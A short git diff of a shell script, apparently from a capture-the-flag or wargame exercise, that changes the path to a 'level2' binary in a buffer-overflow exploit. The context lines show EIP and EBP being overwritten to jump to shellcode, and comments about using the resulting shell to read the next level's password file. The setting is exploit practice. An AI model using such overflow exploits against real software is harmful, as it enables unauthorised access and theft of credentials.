@@ -34,7 +34,7 @@ EIP_REPLACEMENT="$(hex_little_endian ${SHELLCODE_ADDRESS})"
 
 # We print our exploit to the input and wait for the reverse shell to open with cat
 INPUT="${BUFFER}${N}${CALL_ALIGNMENT}${EBP_REPLACEMENT}${EIP_REPLACEMENT}"
-(echo "${INPUT}" && cat) | ./level2
+(echo "${INPUT}" && cat) | /home/user/level2/level2
 
 # We use the reverse shell to retrieve the password
 # $> cat /home/user/level3/.pass
